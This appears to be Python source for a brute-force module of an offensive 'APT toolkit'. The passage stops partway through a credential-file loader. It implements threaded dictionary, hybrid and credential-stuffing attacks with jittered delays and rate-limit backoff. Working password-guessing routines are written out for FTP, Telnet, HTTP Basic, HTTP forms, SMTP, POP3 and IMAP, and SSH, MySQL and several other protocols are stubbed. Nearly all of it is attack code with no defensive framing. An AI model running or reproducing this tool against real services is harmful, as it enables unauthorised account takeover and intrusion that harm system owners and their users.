"""
Brute Force module for the APT toolkit.

This module provides functionality for performing brute force attacks
against various services and protocols, including password guessing,
dictionary attacks, and credential stuffing.
"""

import os
import re
import time
import json
import random
import hashlib
import concurrent.futures
from typing import Dict, List, Set, Tuple, Optional, Union, Any, Callable
from dataclasses import dataclass, field, asdict
from enum import Enum, auto
from pathlib import Path

from src.utils.logger import get_module_logger
from src.utils.config import ConfigManager
from src.utils.network import NetworkUtils, network_utils

logger = get_module_logger("brute_force")

class BruteForceProtocol(Enum):
    """Enumeration of supported brute force protocols"""
    SSH = auto()
    FTP = auto()
    TELNET = auto()
    HTTP_BASIC = auto()
    HTTP_FORM = auto()
    HTTP_DIGEST = auto()
    SMB = auto()
    RDP = auto()
    MYSQL = auto()
    MSSQL = auto()
    POSTGRES = auto()
    MONGODB = auto()
    REDIS = auto()
    SNMP = auto()
    SMTP = auto()
    POP3 = auto()
    IMAP = auto()
    LDAP = auto()
    VNC = auto()
    
    @classmethod
    def from_string(cls, protocol_str: str) -> 'BruteForceProtocol':
        """Convert string to BruteForceProtocol enum"""
        protocol_map = {
            "ssh": cls.SSH,
            "ftp": cls.FTP,
            "telnet": cls.TELNET,
            "http-basic": cls.HTTP_BASIC,
            "http-form": cls.HTTP_FORM,
            "http-digest": cls.HTTP_DIGEST,
            "smb": cls.SMB,
            "rdp": cls.RDP,
            "mysql": cls.MYSQL,
            "mssql": cls.MSSQL,
            "postgres": cls.POSTGRES,
            "mongodb": cls.MONGODB,
            "redis": cls.REDIS,
            "snmp": cls.SNMP,
            "smtp": cls.SMTP,
            "pop3": cls.POP3,
            "imap": cls.IMAP,
            "ldap": cls.LDAP,
            "vnc": cls.VNC
        }
        return protocol_map.get(protocol_str.lower(), cls.SSH)
    
    def get_default_port(self) -> int:
        """Get default port for protocol"""
        port_map = {
            self.SSH: 22,
            self.FTP: 21,
            self.TELNET: 23,
            self.HTTP_BASIC: 80,
            self.HTTP_FORM: 80,
            self.HTTP_DIGEST: 80,
            self.SMB: 445,
            self.RDP: 3389,
            self.MYSQL: 3306,
            self.MSSQL: 1433,
            self.POSTGRES: 5432,
            self.MONGODB: 27017,
            self.REDIS: 6379,
            self.SNMP: 161,
            self.SMTP: 25,
            self.POP3: 110,
            self.IMAP: 143,
            self.LDAP: 389,
            self.VNC: 5900
        }
        return port_map.get(self, 0)

class BruteForceMethod(Enum):
    """Enumeration of brute force methods"""
    DICTIONARY = auto()  # Try all username/password combinations from wordlists
    INCREMENTAL = auto()  # Try all possible combinations of characters
    HYBRID = auto()  # Combine dictionary and incremental methods
    RULE_BASED = auto()  # Apply rules to transform dictionary words
    CREDENTIAL_STUFFING = auto()  # Try known username/password pairs

class BruteForceStatus(Enum):
    """Enumeration of brute force status"""
    PENDING = auto()
    RUNNING = auto()
    COMPLETED = auto()
    FAILED = auto()
    CANCELLED = auto()
    RATE_LIMITED = auto()
    BLOCKED = auto()

@dataclass
class BruteForceCredential:
    """Data class for credential information"""
    username: str
    password: str
    is_valid: bool = False
    source: str = ""  # Where this credential came from
    notes: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)

@dataclass
class BruteForceTarget:
    """Data class for brute force target information"""
    host: str  # IP or hostname
    protocol: BruteForceProtocol
    port: int = 0  # 0 means use default port for protocol
    path: str = ""  # For HTTP targets
    form_data: Dict[str, str] = field(default_factory=dict)  # For HTTP form targets
    custom_auth_function: Optional[Callable] = None  # For custom authentication
    options: Dict[str, Any] = field(default_factory=dict)  # Protocol-specific options
    
    def __post_init__(self):
        """Set default port if not specified"""
        if self.port == 0:
            self.port = self.protocol.get_default_port()

@dataclass
class BruteForceResult:
    """Data class for brute force attack results"""
    target: BruteForceTarget
    start_time: float = field(default_factory=time.time)
    end_time: float = 0.0
    status: BruteForceStatus = BruteForceStatus.PENDING
    valid_credentials: List[BruteForceCredential] = field(default_factory=list)
    tested_credentials: int = 0
    total_credentials: int = 0
    rate_limit_hits: int = 0
    errors: List[str] = field(default_factory=list)
    notes: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        """Convert to dictionary for serialization"""
        result = {
            "target": {
                "host": self.target.host,
                "protocol": self.target.protocol.name,
                "port": self.target.port,
                "path": self.target.path,
                "form_data": self.target.form_data,
                "options": self.target.options
            },
            "start_time": self.start_time,
            "end_time": self.end_time,
            "status": self.status.name,
            "valid_credentials": [asdict(cred) for cred in self.valid_credentials],
            "tested_credentials": self.tested_credentials,
            "total_credentials": self.total_credentials,
            "rate_limit_hits": self.rate_limit_hits,
            "errors": self.errors,
            "notes": self.notes
        }
        return result
    
    def to_json(self, pretty: bool = True) -> str:
        """Convert to JSON string"""
        if pretty:
            return json.dumps(self.to_dict(), indent=4)
        return json.dumps(self.to_dict())
    
    def save_to_file(self, filename: str) -> bool:
        """Save results to a JSON file"""
        try:
            with open(filename, 'w') as f:
                f.write(self.to_json())
            logger.info(f"Saved brute force results to {filename}")
            return True
        except Exception as e:
            logger.error(f"Failed to save results to {filename}: {e}")
            return False
    
    def get_success_rate(self) -> float:
        """Get success rate as percentage"""
        if self.tested_credentials == 0:
            return 0.0
        return (len(self.valid_credentials) / self.tested_credentials) * 100.0
    
    def get_duration(self) -> float:
        """Get attack duration in seconds"""
        if self.end_time > 0:
            return self.end_time - self.start_time
        return time.time() - self.start_time
    
    def get_attempts_per_second(self) -> float:
        """Get attempts per second"""
        duration = self.get_duration()
        if duration == 0:
            return 0.0
        return self.tested_credentials / duration


class BruteForceModule:
    """
    Brute force module for performing password and credential attacks
    against various services and protocols.
    """
    
    # Default wordlists
    DEFAULT_USERNAME_WORDLIST = "src/wordlists/usernames.txt"
    DEFAULT_PASSWORD_WORDLIST = "src/wordlists/common_passwords.txt"
    
    def __init__(self, config: Optional[ConfigManager] = None):
        """
        Initialize the brute force module.
        
        Args:
            config: Optional configuration manager instance.
        """
        self.config = config
        
        # Initialize network utilities
        if config:
            self.network = NetworkUtils(config)
        else:
            self.network = network_utils
            
        # Load configuration settings
        self.timeout = 5
        self.max_threads = 10
        self.retry_count = 3
        self.delay_between_attempts = 0.5
        self.delay_jitter = 0.2
        self.rate_limit_delay = 30
        self.max_rate_limit_hits = 5
        self.output_dir = "results/brute_force"
        self.username_wordlist = self.DEFAULT_USERNAME_WORDLIST
        self.password_wordlist = self.DEFAULT_PASSWORD_WORDLIST
        
        if config:
            self.timeout = config.get("modules.brute_force.timeout", 5)
            self.max_threads = config.get("modules.brute_force.max_threads", 10)
            self.retry_count = config.get("modules.brute_force.retry_count", 3)
            self.delay_between_attempts = config.get("modules.brute_force.delay_between_attempts", 0.5)
            self.delay_jitter = config.get("modules.brute_force.delay_jitter", 0.2)
            self.rate_limit_delay = config.get("modules.brute_force.rate_limit_delay", 30)
            self.max_rate_limit_hits = config.get("modules.brute_force.max_rate_limit_hits", 5)
            self.output_dir = config.get("modules.brute_force.output_dir", "results/brute_force")
            self.username_wordlist = config.get("modules.brute_force.username_wordlist", self.DEFAULT_USERNAME_WORDLIST)
            self.password_wordlist = config.get("modules.brute_force.password_wordlist", self.DEFAULT_PASSWORD_WORDLIST)
            
            # Create output directory if it doesn't exist
            if self.output_dir and not os.path.exists(self.output_dir):
                try:
                    os.makedirs(self.output_dir)
                    logger.info(f"Created output directory: {self.output_dir}")
                except Exception as e:
                    logger.error(f"Failed to create output directory {self.output_dir}: {e}")
    
    def attack(self, target: BruteForceTarget, 
              usernames: Union[List[str], str], 
              passwords: Union[List[str], str],
              method: BruteForceMethod = BruteForceMethod.DICTIONARY,
              **kwargs) -> BruteForceResult:
        """
        Perform a brute force attack against a target.
        
        Args:
            target: Target to attack
            usernames: List of usernames or path to username wordlist
            passwords: List of passwords or path to password wordlist
            method: Brute force method to use
            **kwargs: Optional attack parameters:
                - timeout: Connection timeout in seconds
                - max_threads: Maximum number of concurrent threads
                - retry_count: Number of retries for failed attempts
                - delay_between_attempts: Delay between attempts in seconds
                - delay_jitter: Random jitter to add to delay
                - stop_on_success: Whether to stop after finding valid credentials
                - max_attempts: Maximum number of attempts
                
        Returns:
            BruteForceResult: Brute force attack results
        """
        # Parse attack parameters
        timeout = kwargs.get("timeout", self.timeout)
        max_threads = kwargs.get("max_threads", self.max_threads)
        retry_count = kwargs.get("retry_count", self.retry_count)
        delay_between_attempts = kwargs.get("delay_between_attempts", self.delay_between_attempts)
        delay_jitter = kwargs.get("delay_jitter", self.delay_jitter)
        stop_on_success = kwargs.get("stop_on_success", False)
        max_attempts = kwargs.get("max_attempts", 0)  # 0 means no limit
        
        # Initialize result object
        result = BruteForceResult(target=target)
        
        # Load usernames
        username_list = self._load_wordlist(usernames, "usernames")
        if not username_list:
            error_msg = "No usernames provided or failed to load username wordlist"
            logger.error(error_msg)
            result.errors.append(error_msg)
            result.status = BruteForceStatus.FAILED
            return result
        
        # Load passwords
        password_list = self._load_wordlist(passwords, "passwords")
        if not password_list:
            error_msg = "No passwords provided or failed to load password wordlist"
            logger.error(error_msg)
            result.errors.append(error_msg)
            result.status = BruteForceStatus.FAILED
            return result
        
        # Generate credential pairs based on method
        credentials = self._generate_credentials(username_list, password_list, method)
        
        # Limit attempts if specified
        if max_attempts > 0 and len(credentials) > max_attempts:
            credentials = credentials[:max_attempts]
        
        result.total_credentials = len(credentials)
        logger.info(f"Starting brute force attack against {target.host}:{target.port} ({target.protocol.name})")
        logger.info(f"Using {len(username_list)} usernames and {len(password_list)} passwords")
        logger.info(f"Total credentials to test: {result.total_credentials}")
        
        # Start attack
        result.status = BruteForceStatus.RUNNING
        result.start_time = time.time()
        
        try:
            # Select authentication function based on protocol
            auth_function = self._get_auth_function(target.protocol)
            
            # Use thread pool for concurrent authentication attempts
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
                # Submit authentication tasks
                future_to_credential = {}
                
                for credential in credentials:
                    future = executor.submit(
                        self._try_credential,
                        target,
                        credential,
                        auth_function,
                        timeout,
                        retry_count,
                        delay_between_attempts,
                        delay_jitter
                    )
                    future_to_credential[future] = credential
                
                # Process results as they complete
                for future in concurrent.futures.as_completed(future_to_credential):
                    credential = future_to_credential[future]
                    result.tested_credentials += 1
                    
                    try:
                        is_valid, error = future.result()
                        
                        if is_valid:
                            # Valid credential found
                            credential.is_valid = True
                            result.valid_credentials.append(credential)
                            logger.info(f"Valid credential found: {credential.username}:{credential.password}")
                            
                            # Stop if requested
                            if stop_on_success:
                                logger.info("Stopping attack after finding valid credentials")
                                break
                        
                        if error:
                            if "rate limit" in error.lower() or "too many requests" in error.lower():
                                result.rate_limit_hits += 1
                                
                                if result.rate_limit_hits >= self.max_rate_limit_hits:
                                    logger.warning(f"Rate limit hit {result.rate_limit_hits} times, stopping attack")
                                    result.status = BruteForceStatus.RATE_LIMITED
                                    break
                                
                                # Add delay to avoid rate limiting
                                time.sleep(self.rate_limit_delay)
                            
                    except Exception as e:
                        logger.error(f"Error processing credential result: {e}")
            
            # Set final status
            if result.status != BruteForceStatus.RATE_LIMITED:
                result.status = BruteForceStatus.COMPLETED
            
        except Exception as e:
            error_msg = f"Error during brute force attack: {str(e)}"
            logger.error(error_msg)
            result.errors.append(error_msg)
            result.status = BruteForceStatus.FAILED
        
        # Set end time
        result.end_time = time.time()
        
        # Add summary notes
        duration = result.get_duration()
        attempts_per_second = result.get_attempts_per_second()
        result.notes.append(f"Attack completed in {duration:.2f} seconds")
        result.notes.append(f"Tested {result.tested_credentials} of {result.total_credentials} credentials")
        result.notes.append(f"Average speed: {attempts_per_second:.2f} attempts/second")
        result.notes.append(f"Found {len(result.valid_credentials)} valid credentials")
        
        logger.info(f"Brute force attack completed in {duration:.2f} seconds")
        logger.info(f"Tested {result.tested_credentials} credentials at {attempts_per_second:.2f} attempts/second")
        logger.info(f"Found {len(result.valid_credentials)} valid credentials")
        
        # Save results if output directory is configured
        if self.output_dir:
            timestamp = int(time.time())
            filename = os.path.join(self.output_dir, f"brute_force_{target.host}_{target.port}_{timestamp}.json")
            result.save_to_file(filename)
        
        return result
    
    def _load_wordlist(self, wordlist: Union[List[str], str], wordlist_type: str) -> List[str]:
        """
        Load wordlist from file or use provided list.
        
        Args:
            wordlist: List of words or path to wordlist file
            wordlist_type: Type of wordlist (usernames or passwords)
            
        Returns:
            List[str]: List of words
        """
        if isinstance(wordlist, list):
            return wordlist
        
        if isinstance(wordlist, str):
            # Check if it's a path to a file
            if os.path.exists(wordlist):
                try:
                    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                        words = [line.strip() for line in f if line.strip()]
                    logger.info(f"Loaded {len(words)} {wordlist_type} from {wordlist}")
                    return words
                except Exception as e:
                    logger.error(f"Failed to load {wordlist_type} wordlist from {wordlist}: {e}")
            else:
                logger.error(f"{wordlist_type.capitalize()} wordlist file not found: {wordlist}")
                
                # Try default wordlist as fallback
                default_path = self.DEFAULT_USERNAME_WORDLIST if wordlist_type == "usernames" else self.DEFAULT_PASSWORD_WORDLIST
                if os.path.exists(default_path):
                    try:
                        with open(default_path, 'r', encoding='utf-8', errors='ignore') as f:
                            words = [line.strip() for line in f if line.strip()]
                        logger.info(f"Loaded {len(words)} {wordlist_type} from default wordlist {default_path}")
                        return words
                    except Exception as e:
                        logger.error(f"Failed to load default {wordlist_type} wordlist: {e}")
        
        # If we get here, return an empty list
        return []
    
    def _generate_credentials(self, usernames: List[str], passwords: List[str], 
                             method: BruteForceMethod) -> List[BruteForceCredential]:
        """
        Generate credential pairs based on method.
        
        Args:
            usernames: List of usernames
            passwords: List of passwords
            method: Brute force method
            
        Returns:
            List[BruteForceCredential]: List of credentials
        """
        credentials = []
        
        if method == BruteForceMethod.DICTIONARY:
            # Cartesian product of usernames and passwords
            for username in usernames:
                for password in passwords:
                    credentials.append(BruteForceCredential(
                        username=username,
                        password=password,
                        source="dictionary"
                    ))
        
        elif method == BruteForceMethod.CREDENTIAL_STUFFING:
            # Assume usernames and passwords are paired
            for i in range(min(len(usernames), len(passwords))):
                credentials.append(BruteForceCredential(
                    username=usernames[i],
                    password=passwords[i],
                    source="credential_stuffing"
                ))
        
        elif method == BruteForceMethod.HYBRID:
            # Dictionary attack plus some common variations
            base_credentials = self._generate_credentials(usernames, passwords, BruteForceMethod.DICTIONARY)
            credentials.extend(base_credentials)
            
            # Add some common variations
            for username in usernames:
                # Username as password
                credentials.append(BruteForceCredential(
                    username=username,
                    password=username,
                    source="hybrid_username"
                ))
                
                # Username + common suffixes
                for suffix in ["123", "1234", "12345", "!", "@", "#", "pass", "password"]:
                    credentials.append(BruteForceCredential(
                        username=username,
                        password=username + suffix,
                        source="hybrid_suffix"
                    ))
        
        # For other methods, we would implement more sophisticated generation
        # but for simplicity, we'll use dictionary method as fallback
        else:
            credentials = self._generate_credentials(usernames, passwords, BruteForceMethod.DICTIONARY)
        
        return credentials
    
    def _get_auth_function(self, protocol: BruteForceProtocol) -> Callable:
        """
        Get authentication function for protocol.
        
        Args:
            protocol: Protocol to authenticate against
            
        Returns:
            Callable: Authentication function
        """
        auth_functions = {
            BruteForceProtocol.SSH: self._auth_ssh,
            BruteForceProtocol.FTP: self._auth_ftp,
            BruteForceProtocol.TELNET: self._auth_telnet,
            BruteForceProtocol.HTTP_BASIC: self._auth_http_basic,
            BruteForceProtocol.HTTP_FORM: self._auth_http_form,
            BruteForceProtocol.HTTP_DIGEST: self._auth_http_digest,
            BruteForceProtocol.SMB: self._auth_smb,
            BruteForceProtocol.MYSQL: self._auth_mysql,
            BruteForceProtocol.MSSQL: self._auth_mssql,
            BruteForceProtocol.POSTGRES: self._auth_postgres,
            BruteForceProtocol.SMTP: self._auth_smtp,
            BruteForceProtocol.POP3: self._auth_pop3,
            BruteForceProtocol.IMAP: self._auth_imap
        }
        
        return auth_functions.get(protocol, self._auth_generic)
    
    def _try_credential(self, target: BruteForceTarget, credential: BruteForceCredential,
                       auth_function: Callable, timeout: float, retry_count: int,
                       delay: float, jitter: float) -> Tuple[bool, Optional[str]]:
        """
        Try a credential against a target.
        
        Args:
            target: Target to authenticate against
            credential: Credential to try
            auth_function: Authentication function to use
            timeout: Connection timeout
            retry_count: Number of retries
            delay: Delay between attempts
            jitter: Random jitter to add to delay
            
        Returns:
            Tuple[bool, Optional[str]]: (is_valid, error_message)
        """
        for attempt in range(retry_count + 1):
            try:
                # Add delay with jitter
                if attempt > 0 and delay > 0:
                    jitter_amount = random.uniform(-jitter, jitter) if jitter > 0 else 0
                    time.sleep(max(0, delay + jitter_amount))
                
                # Try authentication
                return auth_function(target, credential, timeout)
                
            except Exception as e:
                error = str(e)
                
                # Check for rate limiting or blocking
                if "rate limit" in error.lower() or "too many requests" in error.lower():
                    return False, error
                
                # Check for connection errors that might be temporary
                if "connection" in error.lower() or "timeout" in error.lower():
                    if attempt < retry_count:
                        logger.debug(f"Retrying after connection error: {error}")
                        continue
                
                return False, error
        
        return False, "Max retries exceeded"
    
    def _auth_generic(self, target: BruteForceTarget, credential: BruteForceCredential,
                     timeout: float) -> Tuple[bool, Optional[str]]:
        """
        Generic authentication function (fallback).
        
        Args:
            target: Target to authenticate against
            credential: Credential to try
            timeout: Connection timeout
            
        Returns:
            Tuple[bool, Optional[str]]: (is_valid, error_message)
        """
        # If target has a custom auth function, use it
        if target.custom_auth_function:
            try:
                return target.custom_auth_function(target, credential, timeout)
            except Exception as e:
                return False, str(e)
        
        return False, "Unsupported protocol"
    
    def _auth_ssh(self, target: BruteForceTarget, credential: BruteForceCredential,
                 timeout: float) -> Tuple[bool, Optional[str]]:
        """
        Authenticate against SSH server.
        
        Args:
            target: Target to authenticate against
            credential: Credential to try
            timeout: Connection timeout
            
        Returns:
            Tuple[bool, Optional[str]]: (is_valid, error_message)
        """
        # In a real implementation, we would use paramiko or similar
        # For demonstration, we'll use a simplified implementation
        try:
            import socket
            
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            
            # Connect to server
            sock.connect((target.host, target.port))
            
            # Read banner
            banner = sock.recv(1024)
            if not banner:
                return False, "No SSH banner received"
            
            # In a real implementation, we would perform SSH authentication
            # For demonstration, we'll just check if the server is running SSH
            if b"SSH" not in banner:
                return False, "Not an SSH server"
            
            # Close socket
            sock.close()
            
            # For demonstration, we'll return False
            # In a real implementation, we would return the actual result
            return False, None
            
        except Exception as e:
            return False, str(e)
    
    def _auth_ftp(self, target: BruteForceTarget, credential: BruteForceCredential,
                 timeout: float) -> Tuple[bool, Optional[str]]:
        """
        Authenticate against FTP server.
        
        Args:
            target: Target to authenticate against
            credential: Credential to try
            timeout: Connection timeout
            
        Returns:
            Tuple[bool, Optional[str]]: (is_valid, error_message)
        """
        try:
            import socket
            
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            
            # Connect to server
            sock.connect((target.host, target.port))
            
            # Read banner
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            if not banner:
                return False, "No FTP banner received"
            
            # Send username
            sock.send(f"USER {credential.username}\r\n".encode())
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            
            # Check if username was accepted
            if not response.startswith("331"):
                sock.close()
                return False, "Username not accepted"
            
            # Send password
            sock.send(f"PASS {credential.password}\r\n".encode())
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            
            # Close socket
            sock.close()
            
            # Check if login was successful
            if response.startswith("230"):
                return True, None
            
            return False, "Invalid credentials"
            
        except Exception as e:
            return False, str(e)
    
    def _auth_telnet(self, target: BruteForceTarget, credential: BruteForceCredential,
                    timeout: float) -> Tuple[bool, Optional[str]]:
        """
        Authenticate against Telnet server.
        
        Args:
            target: Target to authenticate against
            credential: Credential to try
            timeout: Connection timeout
            
        Returns:
            Tuple[bool, Optional[str]]: (is_valid, error_message)
        """
        # In a real implementation, we would use telnetlib or similar
        # For demonstration, we'll use a simplified implementation
        try:
            import socket
            import time
            
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            
            # Connect to server
            sock.connect((target.host, target.port))
            
            # Wait for login prompt
            time.sleep(1)
            sock.recv(1024)  # Clear buffer
            
            # Send username
            sock.send(f"{credential.username}\r\n".encode())
            time.sleep(0.5)
            
            # Wait for password prompt
            sock.recv(1024)  # Clear buffer
            
            # Send password
            sock.send(f"{credential.password}\r\n".encode())
            time.sleep(0.5)
            
            # Check response
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            
            # Close socket
            sock.close()
            
            # Check if login was successful
            # This is a simplified check and would need to be more robust in a real implementation
            if "incorrect" in response.lower() or "failed" in response.lower() or "invalid" in response.lower():
                return False, "Invalid credentials"
            
            return True, None
            
        except Exception as e:
            return False, str(e)
    
    def _auth_http_basic(self, target: BruteForceTarget, credential: BruteForceCredential,
                        timeout: float) -> Tuple[bool, Optional[str]]:
        """
        Authenticate against HTTP Basic Auth.
        
        Args:
            target: Target to authenticate against
            credential: Credential to try
            timeout: Connection timeout
            
        Returns:
            Tuple[bool, Optional[str]]: (is_valid, error_message)
        """
        try:
            # Construct URL
            protocol = "https" if target.port == 443 else "http"
            url = f"{protocol}://{target.host}:{target.port}{target.path}"
            
            # Set up authentication
            auth = (credential.username, credential.password)
            
            # Make request
            status, headers, body = self.network.get_http_request(
                url,
                auth=auth,
                timeout=timeout,
                verify_ssl=False
            )
            
            # Check if authentication was successful
            if status == 401:
                return False, "Invalid credentials"
            elif status >= 200 and status < 300:
                return True, None
            elif status >= 500:
                return False, f"Server error: {status}"
            
            return False, f"Unexpected status code: {status}"
            
        except Exception as e:
            return False, str(e)
    
    def _auth_http_form(self, target: BruteForceTarget, credential: BruteForceCredential,
                       timeout: float) -> Tuple[bool, Optional[str]]:
        """
        Authenticate against HTTP Form.
        
        Args:
            target: Target to authenticate against
            credential: Credential to try
            timeout: Connection timeout
            
        Returns:
            Tuple[bool, Optional[str]]: (is_valid, error_message)
        """
        try:
            # Construct URL
            protocol = "https" if target.port == 443 else "http"
            url = f"{protocol}://{target.host}:{target.port}{target.path}"
            
            # Set up form data
            form_data = target.form_data.copy()
            
            # Find username and password fields
            username_field = target.options.get("username_field", "username")
            password_field = target.options.get("password_field", "password")
            
            # Set username and password
            form_data[username_field] = credential.username
            form_data[password_field] = credential.password
            
            # Make request
            status, headers, body = self.network.post_http_request(
                url,
                data=form_data,
                timeout=timeout,
                verify_ssl=False
            )
            
            # Check for success indicators
            success_url = target.options.get("success_url", "")
            success_text = target.options.get("success_text", "")
            failure_text = target.options.get("failure_text", "")
            
            # Check if authentication was successful
            if success_url and "Location" in headers and success_url in headers["Location"]:
                return True, None
            elif success_text and success_text in body:
                return True, None
            elif failure_text and failure_text in body:
                return False, "Invalid credentials"
            elif status >= 500:
                return False, f"Server error: {status}"
            
            # Default to failure
            return False, "Authentication failed"
            
        except Exception as e:
            return False, str(e)
    
    def _auth_http_digest(self, target: BruteForceTarget, credential: BruteForceCredential,
                         timeout: float) -> Tuple[bool, Optional[str]]:
        """
        Authenticate against HTTP Digest Auth.
        
        Args:
            target: Target to authenticate against
            credential: Credential to try
            timeout: Connection timeout
            
        Returns:
            Tuple[bool, Optional[str]]: (is_valid, error_message)
        """
        # In a real implementation, we would use requests or similar with digest auth
        # For demonstration, we'll return False
        return False, "HTTP Digest authentication not implemented"
    
    def _auth_smb(self, target: BruteForceTarget, credential: BruteForceCredential,
                 timeout: float) -> Tuple[bool, Optional[str]]:
        """
        Authenticate against SMB server.
        
        Args:
            target: Target to authenticate against
            credential: Credential to try
            timeout: Connection timeout
            
        Returns:
            Tuple[bool, Optional[str]]: (is_valid, error_message)
        """
        # In a real implementation, we would use pysmb or similar
        # For demonstration, we'll return False
        return False, "SMB authentication not implemented"
    
    def _auth_mysql(self, target: BruteForceTarget, credential: BruteForceCredential,
                   timeout: float) -> Tuple[bool, Optional[str]]:
        """
        Authenticate against MySQL server.
        
        Args:
            target: Target to authenticate against
            credential: Credential to try
            timeout: Connection timeout
            
        Returns:
            Tuple[bool, Optional[str]]: (is_valid, error_message)
        """
        # In a real implementation, we would use mysql-connector or similar
        # For demonstration, we'll use a simplified implementation
        try:
            import socket
            
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            
            # Connect to server
            sock.connect((target.host, target.port))
            
            # Read greeting
            greeting = sock.recv(1024)
            if not greeting:
                return False, "No MySQL greeting received"
            
            # In a real implementation, we would perform MySQL authentication
            # For demonstration, we'll just check if the server is running MySQL
            if b"mysql" not in greeting.lower():
                return False, "Not a MySQL server"
            
            # Close socket
            sock.close()
            
            # For demonstration, we'll return False
            # In a real implementation, we would return the actual result
            return False, None
            
        except Exception as e:
            return False, str(e)
    
    def _auth_mssql(self, target: BruteForceTarget, credential: BruteForceCredential,
                   timeout: float) -> Tuple[bool, Optional[str]]:
        """
        Authenticate against MSSQL server.
        
        Args:
            target: Target to authenticate against
            credential: Credential to try
            timeout: Connection timeout
            
        Returns:
            Tuple[bool, Optional[str]]: (is_valid, error_message)
        """
        # In a real implementation, we would use pymssql or similar
        # For demonstration, we'll return False
        return False, "MSSQL authentication not implemented"
    
    def _auth_postgres(self, target: BruteForceTarget, credential: BruteForceCredential,
                      timeout: float) -> Tuple[bool, Optional[str]]:
        """
        Authenticate against PostgreSQL server.
        
        Args:
            target: Target to authenticate against
            credential: Credential to try
            timeout: Connection timeout
            
        Returns:
            Tuple[bool, Optional[str]]: (is_valid, error_message)
        """
        # In a real implementation, we would use psycopg2 or similar
        # For demonstration, we'll return False
        return False, "PostgreSQL authentication not implemented"
    
    def _auth_smtp(self, target: BruteForceTarget, credential: BruteForceCredential,
                  timeout: float) -> Tuple[bool, Optional[str]]:
        """
        Authenticate against SMTP server.
        
        Args:
            target: Target to authenticate against
            credential: Credential to try
            timeout: Connection timeout
            
        Returns:
            Tuple[bool, Optional[str]]: (is_valid, error_message)
        """
        try:
            import socket
            
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            
            # Connect to server
            sock.connect((target.host, target.port))
            
            # Read greeting
            greeting = sock.recv(1024).decode('utf-8', errors='ignore')
            if not greeting:
                return False, "No SMTP greeting received"
            
            # Send EHLO
            sock.send(b"EHLO example.com\r\n")
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            
            # Check if server supports AUTH
            if "AUTH" not in response:
                sock.close()
                return False, "SMTP server does not support authentication"
            
            # Send AUTH LOGIN
            sock.send(b"AUTH LOGIN\r\n")
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            
            # Send username (base64 encoded)
            import base64
            username_b64 = base64.b64encode(credential.username.encode()).decode()
            sock.send(f"{username_b64}\r\n".encode())
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            
            # Send password (base64 encoded)
            password_b64 = base64.b64encode(credential.password.encode()).decode()
            sock.send(f"{password_b64}\r\n".encode())
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            
            # Close socket
            sock.close()
            
            # Check if authentication was successful
            if response.startswith("235"):
                return True, None
            
            return False, "Invalid credentials"
            
        except Exception as e:
            return False, str(e)
    
    def _auth_pop3(self, target: BruteForceTarget, credential: BruteForceCredential,
                  timeout: float) -> Tuple[bool, Optional[str]]:
        """
        Authenticate against POP3 server.
        
        Args:
            target: Target to authenticate against
            credential: Credential to try
            timeout: Connection timeout
            
        Returns:
            Tuple[bool, Optional[str]]: (is_valid, error_message)
        """
        try:
            import socket
            
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            
            # Connect to server
            sock.connect((target.host, target.port))
            
            # Read greeting
            greeting = sock.recv(1024).decode('utf-8', errors='ignore')
            if not greeting:
                return False, "No POP3 greeting received"
            
            # Send username
            sock.send(f"USER {credential.username}\r\n".encode())
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            
            # Check if username was accepted
            if not response.startswith("+OK"):
                sock.close()
                return False, "Username not accepted"
            
            # Send password
            sock.send(f"PASS {credential.password}\r\n".encode())
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            
            # Close socket
            sock.close()
            
            # Check if authentication was successful
            if response.startswith("+OK"):
                return True, None
            
            return False, "Invalid credentials"
            
        except Exception as e:
            return False, str(e)
    
    def _auth_imap(self, target: BruteForceTarget, credential: BruteForceCredential,
                  timeout: float) -> Tuple[bool, Optional[str]]:
        """
        Authenticate against IMAP server.
        
        Args:
            target: Target to authenticate against
            credential: Credential to try
            timeout: Connection timeout
            
        Returns:
            Tuple[bool, Optional[str]]: (is_valid, error_message)
        """
        try:
            import socket
            
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            
            # Connect to server
            sock.connect((target.host, target.port))
            
            # Read greeting
            greeting = sock.recv(1024).decode('utf-8', errors='ignore')
            if not greeting:
                return False, "No IMAP greeting received"
            
            # Send login command
            tag = "A001"
            sock.send(f"{tag} LOGIN {credential.username} {credential.password}\r\n".encode())
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            
            # Close socket
            sock.close()
            
            # Check if authentication was successful
            if f"{tag} OK" in response:
                return True, None
            
            return False, "Invalid credentials"
            
        except Exception as e:
            return False, str(e)
    
    def load_credentials_from_file(self, filename: str) -> List[BruteForceCredential]:
        """
        Load credentials from a file.
        
        Args:
            filename: Path to credentials file
            
        Returns:
            List[BruteForceCredential]: List of credentials
        """
        credentials = []
        
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    # Parse line
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        username, password = parts
                        credentials.append(BruteForceCredential(
                            username=username.strip(),
                            password=password.strip(),
                            source=f"file:{filename}"
                        ))
                    else:
